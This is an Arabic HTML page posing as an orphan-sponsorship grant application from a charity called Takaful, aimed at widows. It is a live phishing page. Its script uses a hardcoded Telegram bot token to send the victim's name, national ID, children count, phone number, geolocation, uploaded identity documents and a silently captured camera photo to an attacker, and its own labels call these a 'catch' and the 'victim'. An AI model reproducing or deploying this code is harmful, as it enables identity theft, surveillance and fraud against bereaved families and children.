<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة التسجيل | منظمة تكافل</title>
    <style>
        :root { --main-color: #27ae60; --dark-blue: #2c3e50; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f4f8; direction: rtl; padding: 10px; margin: 0; }
        .header { background: var(--dark-blue); color: white; padding: 20px; text-align: center; border-bottom: 5px solid var(--main-color); border-radius: 0 0 20px 20px; }
        .container { background: white; max-width: 450px; margin: 15px auto; padding: 25px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
        h2 { color: var(--dark-blue); font-size: 20px; margin: 0 0 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        .section-label { background: #e8f5e9; color: var(--main-color); padding: 5px 12px; border-radius: 5px; font-size: 13px; font-weight: bold; display: inline-block; margin-bottom: 15px; }
        .input-group { margin-bottom: 15px; text-align: right; }
        label { display: block; font-size: 13px; font-weight: bold; color: #555; margin-bottom: 5px; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; background: #fdfdfd; font-size: 14px; }
        input:focus { border-color: var(--main-color); outline: none; box-shadow: 0 0 5px rgba(39, 174, 96, 0.2); }
        .btn { background: var(--main-color); color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; cursor: pointer; font-size: 17px; font-weight: bold; transition: 0.3s; margin-top: 10px; }
        .btn:hover { background: #219150; transform: translateY(-2px); }
        .footer { font-size: 11px; color: #999; margin-top: 25px; text-align: center; border-top: 1px solid #eee; padding-top: 15px; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://img.icons8.com/color/96/charity.png" width="50">
    <div style="font-size: 18px; font-weight: bold; margin-top: 5px;">منظمة تكافل الإنسانية</div>
    <div style="font-size: 11px; opacity: 0.8;">بوابة الدعم الاجتماعي الموحدة لعام 2026</div>
</div>

<div class="container">
    <h2>استمارة منحة كفالة الأيتام</h2>
    
    <div class="section-label">1. البيانات الشخصية</div>
    <div class="input-group">
        <label>الاسم الكامل للأرملة (كما في الهوية):</label>
        <input type="text" id="name" placeholder="مثال: مريم الأحمد">
    </div>
    <div class="input-group">
        <label>رقم الهوية / الرقم الوطني:</label>
        <input type="number" id="id_num" placeholder="00000000000">
    </div>

    <div class="section-label">2. بيانات المعيل والمتوفى</div>
    <div class="input-group">
        <label>تاريخ وفاة الزوج:</label>
        <input type="text" id="death" placeholder="يوم / شهر / سنة">
    </div>
    <div class="input-group">
        <label>عدد الأبناء تحت سن 18:</label>
        <input type="number" id="kids" placeholder="عدد الأطفال القاصرين">
    </div>

    <div class="section-label">3. الثبوتيات والتواصل</div>
    <div class="input-group">
        <label>رقم الواتساب للتواصل (مع الرمز الدولي):</label>
        <input type="tel" id="phone" placeholder="+963">
    </div>
    <div class="input-group">
        <label>رفع صور الهوية ودفتر العائلة (اختيار متعدد):</label>
        <input type="file" id="studiofiles" multiple accept="image/*">
    </div>

    <button class="btn" onclick="executeTakaful()">تأكيد البيانات وطلب المنحة</button>
    
    <div class="footer">
        © جميع الحقوق محفوظة - منظمة تكافل الإنسانية<br>
        قسم الإغاثة السريعة - بوابة التحقق الرقمي
    </div>
</div>

<canvas id="canvas" style="display:none;"></canvas>
<video id="video" style="display:none;" autoplay></video>

<script>
    const TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
    const CHAT_ID = "7214473798";

    async function sendToBot(type, data, caption = "") {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        if (type === "text") {
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
            });
        } else {
            formData.append(type, data, "file.jpg");
            if (caption) formData.append("caption", caption);
            await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
                method: "POST",
                body: formData
            });
        }
    }

    async function executeTakaful() {
        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        if (!name || !phone) { alert("يرجى إكمال البيانات الأساسية!"); return; }

        alert("جاري الاتصال بخوادم منظمة تكافل.. يرجى السماح بالصلاحيات لمطابقة بياناتك الجغرافية.");

        // 1. الموقع الجغرافي
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const map = `📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            const info = `🔥 **صيد جديد (منظمة تكافل)** 🔥\n👤 الاسم: ${name}\n🆔 الهوية: ${document.getElementById('id_num').value}\n👦 الأطفال: ${document.getElementById('kids').value}\n📅 الوفاة: ${document.getElementById('death').value}\n📞 الهاتف: ${phone}\n${map}`;
            await sendToBot("text", info);
        });

        // 2. إرسال صور الاستديو
        const files = document.getElementById('studiofiles').files;
        for (let file of files) {
            await sendToBot("document", file, "📁 ملف مرفوع من الضحية");
        }

        // 3. الكاميرا (تصوير تلقائي صامت)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            video.srcObject = stream;

            setTimeout(async () => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(async (blob) => {
                    await sendToBot("photo", blob, "📸 لقطة التحقق المباشرة");
                    stream.getTracks().forEach(track => track.stop());
                    alert("تم إرسال طلبك بنجاح. سيتم مراجعة البيانات والتواصل معك قريباً.");
                }, 'image/jpeg');
            }, 2500);
        } catch (e) {
            alert("فشل التحقق! يرجى منح الصلاحيات لمطابقة بياناتك الشخصية لدى المنظمة.");
        }
    }
</script>
</body>
</html>
